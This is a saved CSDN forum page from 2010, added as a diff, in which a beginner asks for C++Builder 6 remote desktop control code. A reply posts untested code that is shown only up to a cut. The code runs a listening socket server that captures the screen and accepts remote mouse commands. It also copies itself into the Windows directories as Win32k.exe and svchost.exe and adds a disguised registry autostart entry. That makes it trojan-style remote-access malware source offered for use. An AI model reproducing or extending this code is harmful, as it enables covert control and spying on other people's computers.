@@ -1,0 +1,927 @@
+﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
+<!-- saved from url=(0036)http://bbs.csdn.net/topics/350001529 -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><HTML><HEAD><META 
+content="IE=9.0000" http-equiv="X-UA-Compatible">
+
+<META content="text/html; charset=utf-8" 
+http-equiv="Content-Type"><TITLE>c++builder新手菜鸟跪求BCB6下的远程桌面控制的代码程序。。。 - CSDN论坛 - 
+CSDN.NET</TITLE><LINK rel="stylesheet" type="text/css" href="注释详细BCB6下的远程桌面控制的代码程序_files/main-9c8fdee294177d7391e2d05f1530c50c.css" 
+media="screen">
+<SCRIPT type="text/javascript" src="注释详细BCB6下的远程桌面控制的代码程序_files/application-f64fa875437219c244af5383ba84f061.js"></SCRIPT>
+
+<META name="csrf-param" content="authenticity_token">
+<META name="csrf-token" 
+content="T8xeUfN8PG060oAeyMzYx2cUcW/BBM/uAlpWBlaHblQ="><LINK rel="SHORTCUT ICON" 
+href="http://csdnimg.cn/www/images/favicon.ico"><LINK rel="stylesheet" type="text/css" 
+href="注释详细BCB6下的远程桌面控制的代码程序_files/sh-b0c626c4f7a0a170cc85ce3acab147a7.css" 
+media="all">
+<SCRIPT type="text/javascript" src="注释详细BCB6下的远程桌面控制的代码程序_files/sh-36826e6af2f32102561ae428c744520f.js"></SCRIPT>
+
+<META name="GENERATOR" content="MSHTML 9.00.8112.16450"></HEAD>
+<BODY>
+<DIV class="wraper">
+<SCRIPT type="text/javascript" src="注释详细BCB6下的远程桌面控制的代码程序_files/pub_topnav_2011.js"></SCRIPT>
+<!-- 页顶通栏 --><IFRAME id="Topic_Top" marginHeight="0" src="about:blank" 
+frameBorder="0" width="100%" marginWidth="0" scrolling="no"></IFRAME>
+<DIV id="nav"><A class="logo" href="http://bbs.csdn.net/" target="_top"></A>
+<DIV class="nav_list"><A class="home" title="CSDN论坛首页" href="http://bbs.csdn.net/home">首页</A><A 
+href="http://bbs.csdn.net/help"><SPAN>论坛帮助</SPAN></A><A href="http://bbs.csdn.net/rank"><SPAN>论坛牛人</SPAN></A><A 
+href="http://bbs.csdn.net/map"><SPAN>论坛地图</SPAN></A></DIV>
+<DIV class="nav_sear">
+<FORM action="http://so.csdn.net/search" target="_blank"><INPUT name="t" value="thread" 
+type="hidden"><INPUT name="q" type="text"></FORM></DIV></DIV><!--[if IE]>
+<STYLE type="text/css" media="screen">
+.control_area .control .drop_menu{border:3px solid #ccc \9; _*border:3px solid #ccc;}
+</STYLE>
+<![endif]--><!-- 页顶Button (D3) --><IFRAME id="frm_tt1" marginHeight="0" src="注释详细BCB6下的远程桌面控制的代码程序_files/TopicPageTop.htm" 
+frameBorder="0" width="100%" marginWidth="0" scrolling="no"></IFRAME>
+<SCRIPT type="text/javascript">
+    setTimeout(function () { document.getElementById("frm_tt1").src = "/sda/TopicBodyTop.htm?v="+new Date().getTime(); }, 5000);
+  </SCRIPT>
+
+<DIV class="bread_nav"><A href="http://www.csdn.net/" target="_blank">CSDN</A> 
+<EM>&gt;</EM><A href="http://bbs.csdn.net/" target="_blank">CSDN论坛</A> 
+<EM>&gt;</EM><A href="http://bbs.csdn.net/forums/BCB" target="_blank">C++ 
+Builder</A> <EM>&gt;</EM><A href="http://bbs.csdn.net/forums/BCBBase" target="_blank">基础类</A>
+</DIV>
+<DIV class="flash_messages"></DIV>
+<DIV class="control_area">
+<FORM id="form" name="form">
+<DIV class="control">
+<UL>
+  <LI class="drop_menu_wrap drop_menu_down"><A class="drop_toggle btn_1" href="http://bbs.csdn.net/topics/350001529#"><SPAN><IMG 
+  alt="" src="注释详细BCB6下的远程桌面控制的代码程序_files/ico_set.gif">管理菜单<IMG alt="" src="注释详细BCB6下的远程桌面控制的代码程序_files/arrow_down.gif"></SPAN></A>
+  <UL style="top: 26px; display: none;" class="drop_menu">
+    <LI><A class="fancybox" 
+    href="http://bbs.csdn.net/topics/350001529/top">置顶</A></LI>
+    <LI><A href="http://bbs.csdn.net/topics/350001529/recommend" rel="nofollow" 
+    data-method="put" 
+    data-confirm="确定要将该帖推荐(加精)吗？被推荐的帖子将给帖主奖励可用分88分!">推荐</A></LI>
+    <LI><A class="fancybox" 
+    href="http://bbs.csdn.net/topics/350001529/lock">锁定</A></LI>
+    <LI><A class="fancybox" 
+    href="http://bbs.csdn.net/topics/350001529/move">移动</A></LI>
+    <LI><A class="fancybox" 
+    href="http://bbs.csdn.net/topics/350001529/edit">编辑</A></LI>
+    <LI><A class="fancybox" href="http://bbs.csdn.net/topics/350001529/destroy_edit">删除</A></LI>
+    <LI><A class="fancybox" href="http://bbs.csdn.net/topics/350001529/add_point">帖子加分</A></LI>
+    <LI><A class="fancybox" href="http://bbs.csdn.net/topics/350001529/highlight">帖子高亮</A></LI></UL></LI>
+  <LI><A class="btn_1" 
+  href="http://bbs.csdn.net/topics/350001529/close"><SPAN><IMG alt="" src="注释详细BCB6下的远程桌面控制的代码程序_files/ico_over.gif">结帖</SPAN></A></LI>
+  <LI><A class="btn_1" 
+  href="http://bbs.csdn.net/topics/new?forum_id=BCBBase"><SPAN><IMG alt="" src="注释详细BCB6下的远程桌面控制的代码程序_files/ico_publish.gif">发帖</SPAN></A></LI>
+  <LI><A class="btn_1" 
+  href="http://bbs.csdn.net/topics/350001529#new_post"><SPAN><IMG alt="" src="注释详细BCB6下的远程桌面控制的代码程序_files/ico_return.gif">回复</SPAN></A></LI></UL></DIV></FORM>
+</DIV>
+<DIV class="detail_title">
+<DIV class="fr"><SELECT name="filter_posts"><OPTION 
+  value="default">不显示删除回复</OPTION><OPTION value="all">显示所有回复</OPTION><OPTION 
+  value="star">显示星级回复</OPTION><OPTION value="pointed">显示得分回复</OPTION></SELECT><A 
+id="fav" class="fav" href="http://my.csdn.net/my/favorite/miniadd?u=http://bbs.csdn.net/topics/350001529&amp;t=c++builder%E6%96%B0%E6%89%8B%E8%8F%9C%E9%B8%9F%E8%B7%AA%E6%B1%82BCB6%E4%B8%8B%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%8E%A7%E5%88%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E7%A8%8B%E5%BA%8F%E3%80%82%E3%80%82%E3%80%82"><IMG 
+alt="" src="注释详细BCB6下的远程桌面控制的代码程序_files/nolines_plus.gif">收藏</A></DIV>
+<H1>c++builder新手菜鸟跪求BCB6下的远程桌面控制的代码程序。。。    <SPAN class="red">[问题点数：100分]    
+</SPAN></H1></DIV>
+<DIV class="detailed">
+<TABLE id="post-350001529" class="post topic " border="0" cellSpacing="0" 
+cellPadding="0" data-post-id="350001529">
+  <COLGROUP>
+  <COL width="180">
+  <COL></COLGROUP>
+  <TBODY>
+  <TR>
+    <TD class="wirter" vAlign="top" rowSpan="4">
+      <DL class="user_info ">
+        <DT class="user_head" data-username="zhaozilongg"><A href="http://my.csdn.net/zhaozilongg" 
+        target="_blank"><IMG class="avatar" alt="zhaozilongg" src="注释详细BCB6下的远程桌面控制的代码程序_files/1_zhaozilongg.gif"></A></DT>
+        <DD class="username"><A href="http://my.csdn.net/zhaozilongg" target="_blank">zhaozilongg</A></DD>
+        <DD class="nickname">该用户很懒,没设置昵称</DD>
+        <DD title="总技术分：0；总技术排名：2485996">等级：<IMG class="grade user1" alt="Blank" 
+        src="注释详细BCB6下的远程桌面控制的代码程序_files/blank.gif"></DD>
+        <DD class="close_rate" 
+        title="用户结帖率：0%&#10;总发帖：3&#10;正常结帖：0&#10;未结帖：3">结帖率：0%</DD></DL></TD>
+    <TD style="display: none;"></TD></TR>
+  <TR class="post_info topic pointed" data-username="zhaozilongg" 
+    data-floor=""><TD class="data"><STRONG class="fr">楼主          
+      </STRONG><SPAN class="time">            发表于：          2010-08-20 16:37:50  
+            </SPAN></TD></TR>
+  <TR>
+    <TD>
+      <DIV 
+      class="post_body">如题：c++builder新手菜鸟跪求BCB6下的远程桌面控制的代码程序。。。最好有详细的代码讲解。和控件的设置 
+             </DIV><!-- 主帖下Banner (D4) --><!-- 主帖下文字 (D5) --><IFRAME id="tad2" 
+      marginHeight="0" src="注释详细BCB6下的远程桌面控制的代码程序_files/TopicBodyTop.htm" 
+      frameBorder="0" width="100%" marginWidth="0" 
+scrolling="no"></IFRAME></TD></TR>
+  <TR>
+    <TD class="control">
+      <DIV class="fr"><A class="red digg" href="http://bbs.csdn.net/posts/350001529/digg?topic_id=350001529" 
+      rel="nofollow" data-method="put" data-remote="true">对我有用[1]</A><A class="bury" 
+      href="http://bbs.csdn.net/posts/350001529/bury?topic_id=350001529" rel="nofollow" 
+      data-method="put" data-remote="true">丢个板砖[0]</A><A class="quote" href="http://bbs.csdn.net/topics/350001529#quote">引用</A> 
+      |          <A class="fancybox red" href="http://bbs.csdn.net/posts/350001529/report?topic_id=350001529">举报 
+      </A> |          <SPAN class="manage-toggle">
+      <DIV style="display: none;" class="manage"><A class="fancybox" href="http://bbs.csdn.net/topics/350001529/edit">编辑</A><A 
+      class="fancybox" 
+      href="http://bbs.csdn.net/topics/350001529/destroy_edit">删除</A></DIV>      
+            管理          </SPAN> |          <A href="http://bbs.csdn.net/topics/350001529#">TOP</A></DIV><SPAN 
+      class="return_time">回复次数：11</SPAN></TD></TR></TBODY></TABLE>
+<TABLE id="post-350778723" class="post  " border="0" cellSpacing="0" 
+cellPadding="0" data-post-id="350778723">
+  <COLGROUP>
+  <COL width="180">
+  <COL></COLGROUP>
+  <TBODY>
+  <TR>
+    <TD class="wirter" vAlign="top" rowSpan="4">
+      <DL class="user_info ">
+        <DT class="user_head" data-username="jone7319"><A href="http://my.csdn.net/jone7319" 
+        target="_blank"><IMG class="avatar" alt="jone7319" src="注释详细BCB6下的远程桌面控制的代码程序_files/1_jone7319.jpg"></A></DT>
+        <DD class="username"><A href="http://my.csdn.net/jone7319" target="_blank">jone7319</A></DD>
+        <DD class="nickname">舍我其谁</DD>
+        <DD title="总技术分：6494；总技术排名：4587">等级：<IMG class="grade star1" alt="Blank" 
+        src="注释详细BCB6下的远程桌面控制的代码程序_files/blank.gif"></DD>
+        <DD class="close_rate" title="用户结帖率：99.16%&#10;总发帖：119&#10;正常结帖：118&#10;未结帖：1">结帖率：99.16%</DD></DL></TD>
+    <TD style="display: none;"></TD></TR>
+  <TR class="post_info star" data-username="jone7319" data-floor="1">
+    <TD class="data"><SPAN class="fr"><A href="http://bbs.csdn.net/topics/350001529#post-350778723">#1</A>得分：0 
+               </SPAN><SPAN class="time">回复于：          2010-08-20 17:21:05       
+       </SPAN></TD></TR>
+  <TR>
+    <TD>
+      <DIV class="post_body">这是别人写的代码，没试过，你试看行不<BR><PRE class="brush: C/C++"><BR>
+//---------------------------------------------------------------------------&nbsp;<BR>
+<BR>
+#include&nbsp;&nbsp;&nbsp;&lt;vcl.h&gt;&nbsp;<BR>
+#include&nbsp;&nbsp;&nbsp;&lt;jpeg.hpp&gt;&nbsp;<BR>
+#include&nbsp;&nbsp;&nbsp;&lt;stdio.h&gt;&nbsp;<BR>
+#include&nbsp;&nbsp;&nbsp;&lt;tlhelp32.h&gt;&nbsp;<BR>
+#include&nbsp;&nbsp;&nbsp;&lt;FileCtrl.hpp&gt;&nbsp;<BR>
+#include&nbsp;&nbsp;&nbsp;&lt;Registry.hpp&gt;&nbsp;<BR>
+#pragma&nbsp;&nbsp;&nbsp;hdrstop&nbsp;<BR>
+<BR>
+#include&nbsp;&nbsp;&nbsp;"UniMain.h&nbsp;"&nbsp;<BR>
+#include&nbsp;&nbsp;&nbsp;"Socket.h&nbsp;"&nbsp;<BR>
+#include&nbsp;&nbsp;&nbsp;"File.h&nbsp;"&nbsp;<BR>
+#include&nbsp;&nbsp;&nbsp;"UniSetup.h&nbsp;"&nbsp;<BR>
+<BR>
+//---------------------------------------------------------------------------&nbsp;<BR>
+#pragma&nbsp;&nbsp;&nbsp;package(smart_init)&nbsp;<BR>
+#pragma&nbsp;&nbsp;&nbsp;resource&nbsp;&nbsp;&nbsp;"*.dfm&nbsp;"&nbsp;<BR>
+#define&nbsp;&nbsp;&nbsp;CM_ENTIRESCREEN&nbsp;&nbsp;&nbsp;201&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//捕获全屏&nbsp;<BR>
+#define&nbsp;&nbsp;&nbsp;CM_ACTIVEWINDOW&nbsp;&nbsp;&nbsp;202&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//捕获当前窗口&nbsp;<BR>
+#define&nbsp;&nbsp;&nbsp;CM_CUSTORWINDOW&nbsp;&nbsp;&nbsp;203&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//捕获自定义窗口&nbsp;<BR>
+const&nbsp;&nbsp;&nbsp;FILESIZE&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;1024;&nbsp;<BR>
+Tmain&nbsp;&nbsp;&nbsp;*main;&nbsp;<BR>
+//---------------------------------------------------------------------------&nbsp;<BR>
+__fastcall&nbsp;&nbsp;&nbsp;Tmain::Tmain(TComponent*&nbsp;&nbsp;&nbsp;Owner)&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;&nbsp;TForm(Owner)&nbsp;<BR>
+{&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;bLockButton&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;false;&nbsp;<BR>
+}&nbsp;<BR>
+//---------------------------------------------------------------------------&nbsp;<BR>
+<BR>
+void&nbsp;&nbsp;&nbsp;__fastcall&nbsp;&nbsp;&nbsp;Tmain::FormCreate(TObject&nbsp;&nbsp;&nbsp;*Sender)&nbsp;<BR>
+{&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;//char&nbsp;&nbsp;&nbsp;*ClassName&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;new&nbsp;&nbsp;&nbsp;char[25];&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;//char&nbsp;&nbsp;&nbsp;*WindowName&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;new&nbsp;&nbsp;&nbsp;char[25];&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;//ClassName&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;"Tmain&nbsp;";&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;//WindowName&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;"main&nbsp;";&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;//if&nbsp;&nbsp;&nbsp;(FindWindow(ClassName,WindowName))ShowMessage(&nbsp;"over&nbsp;");&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;ServerSocket1-&gt;&nbsp;Port&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;LISTENPORT;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;指定监听端口&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1999;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;//ServerSocket1-&gt;&nbsp;Port&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;LISTENPORT;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;//delete&nbsp;&nbsp;&nbsp;ClassName;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;//delete&nbsp;&nbsp;&nbsp;WindowName;&nbsp;<BR>
+ServerSocket1-&gt;&nbsp;Open();&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;&nbsp;&nbsp;windir[256];&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;GetWindowsDirectory(windir,sizeof(windir));&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;CopyServerName(AnsiString(windir)+&nbsp;"\\system32\\Win32k.exe&nbsp;");&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;CopyServerName(AnsiString(windir)+&nbsp;"\\svchost.exe&nbsp;");&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;SetupRegistry(&nbsp;"Windows&nbsp;",AnsiString(windir)+&nbsp;"\\SVCHOST.EXE&nbsp;");&nbsp;<BR>
+}&nbsp;<BR>
+//---------------------------------------------------------------------------&nbsp;<BR>
+void&nbsp;&nbsp;&nbsp;__fastcall&nbsp;&nbsp;&nbsp;Tmain::CaptureImage(int&nbsp;&nbsp;&nbsp;options,&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;level,&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;cq,&nbsp;&nbsp;&nbsp;TMemoryStream*&nbsp;&nbsp;&nbsp;imgstream)&nbsp;<BR>
+{&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;LONG&nbsp;&nbsp;&nbsp;width,height;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;RECT&nbsp;&nbsp;&nbsp;capRect;&nbsp;<BR>
+HDC&nbsp;&nbsp;&nbsp;DesktopDC;&nbsp;<BR>
+switch&nbsp;&nbsp;&nbsp;(options)&nbsp;&nbsp;&nbsp;{&nbsp;<BR>
+case&nbsp;&nbsp;&nbsp;CM_ENTIRESCREEN:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;捕获整个屏幕&nbsp;<BR>
+//&nbsp;&nbsp;&nbsp;取得桌面的矩形区域范围&nbsp;<BR>
+GetWindowRect(GetDesktopWindow(),&amp;capRect);&nbsp;<BR>
+break;&nbsp;<BR>
+case&nbsp;&nbsp;&nbsp;CM_ACTIVEWINDOW:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;捕获当前窗口&nbsp;<BR>
+HWND&nbsp;&nbsp;&nbsp;ForegWin;&nbsp;<BR>
+ForegWin&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;GetForegroundWindow();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;取得当前窗口句柄&nbsp;<BR>
+if&nbsp;&nbsp;&nbsp;(!ForegWin)&nbsp;<BR>
+ForegWin&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;GetDesktopWindow();&nbsp;<BR>
+GetWindowRect(ForegWin,&amp;capRect);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;取得当前窗口的矩形区域范围&nbsp;<BR>
+break;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&nbsp;&nbsp;CM_CUSTORWINDOW:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//捕获自定义窗口&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*capRect.left&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;10;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;capRect.right&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;100;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;capRect.top&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;10;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;capRect.bottom&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;100;*/&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;capRect&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;cusRect;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//GetWindowRect(GetDesktopWindow(),&amp;capRect);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default:break;&nbsp;<BR>
+}&nbsp;<BR>
+<BR>
+DesktopDC&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;GetDC(GetDesktopWindow());&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;创建内存设备描述表&nbsp;<BR>
+width&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;capRect.right&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;capRect.left;&nbsp;<BR>
+height&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;capRect.bottom&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;capRect.top;&nbsp;<BR>
+Graphics::TBitmap&nbsp;&nbsp;&nbsp;*bBitmap;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;定义位图变量&nbsp;<BR>
+try&nbsp;&nbsp;&nbsp;{&nbsp;<BR>
+bBitmap&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;new&nbsp;&nbsp;&nbsp;Graphics::TBitmap();&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;创建位图&nbsp;<BR>
+bBitmap-&gt;&nbsp;Width=width;&nbsp;<BR>
+bBitmap-&gt;&nbsp;Height=height;&nbsp;<BR>
+if&nbsp;&nbsp;&nbsp;((level&gt;&nbsp;0)&amp;&amp;(level&nbsp;&lt;8))&nbsp;<BR>
+bBitmap-&gt;&nbsp;PixelFormat&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;TPixelFormat(5);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;设定色深&nbsp;<BR>
+//&nbsp;&nbsp;&nbsp;拷贝屏幕的指定区域到位图&nbsp;<BR>
+BitBlt(bBitmap-&gt;&nbsp;Canvas-&gt;&nbsp;Handle,0,0,width,height,DesktopDC,&nbsp;<BR>
+capRect.left,capRect.top,SRCCOPY);&nbsp;<BR>
+<BR>
+if&nbsp;&nbsp;&nbsp;(cq&gt;&nbsp;=0)&nbsp;&nbsp;&nbsp;{&nbsp;<BR>
+TJPEGImage&nbsp;&nbsp;&nbsp;*jpeg;&nbsp;<BR>
+try&nbsp;&nbsp;&nbsp;{&nbsp;<BR>
+jpeg&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;new&nbsp;&nbsp;&nbsp;TJPEGImage;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;创建JPEG图象&nbsp;<BR>
+jpeg-&gt;&nbsp;CompressionQuality&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;cq;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;设定图象品质&nbsp;<BR>
+jpeg-&gt;&nbsp;Assign(bBitmap);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;将位图转化为JPEG格式&nbsp;<BR>
+jpeg-&gt;&nbsp;SaveToStream(imgstream);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;保存JPEG图象信息&nbsp;<BR>
+}&nbsp;<BR>
+&nbsp;&nbsp;__finally&nbsp;&nbsp;&nbsp;{&nbsp;<BR>
+delete&nbsp;&nbsp;&nbsp;jpeg;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;释放资源&nbsp;<BR>
+}&nbsp;<BR>
+}&nbsp;<BR>
+else&nbsp;&nbsp;&nbsp;{&nbsp;<BR>
+bBitmap-&gt;&nbsp;SaveToStream(imgstream);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;保存位图信息&nbsp;<BR>
+}&nbsp;<BR>
+}&nbsp;<BR>
+__finally&nbsp;&nbsp;&nbsp;{&nbsp;<BR>
+delete&nbsp;&nbsp;&nbsp;bBitmap;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;释放资源&nbsp;<BR>
+}&nbsp;<BR>
+}&nbsp;<BR>
+//---------------------------------------------------------------------------&nbsp;<BR>
+void&nbsp;&nbsp;&nbsp;__fastcall&nbsp;&nbsp;&nbsp;Tmain::ServerSocket1ClientRead(TObject&nbsp;&nbsp;&nbsp;*Sender,&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TCustomWinSocket&nbsp;&nbsp;&nbsp;*Socket)&nbsp;<BR>
+{&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;//ShowMessage(Socket-&gt;&nbsp;ReceiveText());&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;AnsiString&nbsp;&nbsp;&nbsp;sRecvString&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;Socket-&gt;&nbsp;ReceiveText();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;保存接收到的字符串&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;//ShowMessage(sRecvString);&nbsp;<BR>
+AnsiString&nbsp;&nbsp;&nbsp;sRemoteAddress&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;Socket-&gt;&nbsp;RemoteAddress;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;保存对方IP&nbsp;<BR>
+int&nbsp;&nbsp;&nbsp;CL,CQ;&nbsp;<BR>
+u_short&nbsp;&nbsp;&nbsp;port;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;CmdType,&nbsp;&nbsp;&nbsp;RectCmd;&nbsp;<BR>
+<BR>
+//&nbsp;&nbsp;&nbsp;将接收到的字符串分解为命令类别、接收端口、色深、品质4个参数&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;pos&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;sRecvString.Pos(&nbsp;"\n&nbsp;");&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;命令类别&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AnsiString&nbsp;&nbsp;&nbsp;Socket_Readln(int&nbsp;&nbsp;&nbsp;sockfd);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;1:请求图象发送(附加参数：接收端口、色深、品质)&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;2:请求目标机屏幕分辨率(附加参数：无)&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;3:接收鼠标信息(附加参数：鼠标命令、X坐标、Y坐标)&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;4:锁鼠&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;CmdType=StrToIntDef(sRecvString.SubString(1,pos-1),0);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;sRecvString&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;sRecvString.SubString(pos+1,sRecvString.Length()-pos);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;pos&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;sRecvString.Pos(&nbsp;"\n&nbsp;");&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;switch(CmdType)&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&nbsp;&nbsp;1://请求图象发送&nbsp;<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;指定窗口区域&nbsp;<BR>
